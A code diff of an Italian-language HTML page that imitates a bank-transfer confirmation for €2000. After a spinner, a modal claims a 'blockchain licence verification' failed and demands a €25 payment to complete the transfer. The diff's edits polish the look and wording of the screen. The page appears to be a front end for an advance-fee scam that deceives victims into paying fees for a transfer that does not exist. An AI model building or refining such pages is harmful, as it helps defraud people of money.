@@ -6,52 +6,59 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f4f4f4;
+      background-color: #f2f2f2;
       margin: 0;
       padding: 0;
       color: #333;
     }
-    .container {
-      max-width: 400px;
+    .screen {
+      max-width: 360px;
       margin: 60px auto;
       background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.05);
+      border-radius: 16px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
       padding: 24px;
       text-align: center;
     }
-    h2 {
-      color: #0078D4;
+    .amount {
+      font-size: 32px;
+      font-weight: bold;
       margin-bottom: 16px;
+      color: #222;
+    }
+    .recipient {
+      font-size: 16px;
+      margin-bottom: 8px;
+    }
+    .iban {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 24px;
     }
     label {
       display: block;
       text-align: left;
       margin-top: 12px;
       font-weight: bold;
+      font-size: 14px;
     }
     input {
       width: 100%;
       padding: 10px;
       margin-top: 6px;
       border: 1px solid #ccc;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 14px;
     }
-    .amount {
-      font-size: 24px;
-      margin: 20px 0;
-      color: #222;
-    }
-    .send-btn {
+    .link-btn {
       background-color: #6a1b9a;
       color: #fff;
       border: none;
       padding: 12px;
       width: 100%;
-      border-radius: 8px;
+      border-radius: 12px;
       font-size: 16px;
-      margin-top: 20px;
+      margin-top: 24px;
       cursor: pointer;
     }
 
@@ -69,9 +76,9 @@
     .modal-content {
       background: #fff;
       padding: 24px;
-      border-radius: 12px;
+      border-radius: 16px;
       text-align: center;
-      width: 300px;
+      width: 320px;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
     }
     .spinner {
@@ -92,7 +99,7 @@
       color: #fff;
       border: none;
       padding: 10px 20px;
-      border-radius: 6px;
+      border-radius: 12px;
       font-size: 14px;
       margin-top: 16px;
       cursor: pointer;
@@ -100,9 +107,8 @@
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Conferma Bonifico</h2>
-    <div class="amount">€2000 inviato</div>
+  <div class="screen">
+    <div class="amount">€2000</div>
 
     <label for="name">Nome del destinatario</label>
     <input type="text" id="name" placeholder="Es. Piccione Elisa">
@@ -110,7 +116,7 @@
     <label for="iban">Numero IBAN</label>
     <input type="text" id="iban" placeholder="Es. IT66 A076 0111 3000 0107 6539 921">
 
-    <button class="send-btn" onclick="startTransaction()">Invia</button>
+    <button class="link-btn" onclick="startTransaction()">Fatto</button>
   </div>
 
   <!-- Modal -->
@@ -136,7 +142,7 @@
       setTimeout(() => {
         spinner.style.display = 'none';
         modalText.innerHTML = `
-          ❌ Errore: Verifica della licenza blockchain fallita<br><br>
+          ❌ Errore: Verifica licenza blockchain fallita<br><br>
           È necessario un pagamento di <strong>€25</strong> per completare la transazione.<br><br>
           Destinatario: <strong>${name}</strong><br>
           IBAN: <code>${iban}</code><br><br>
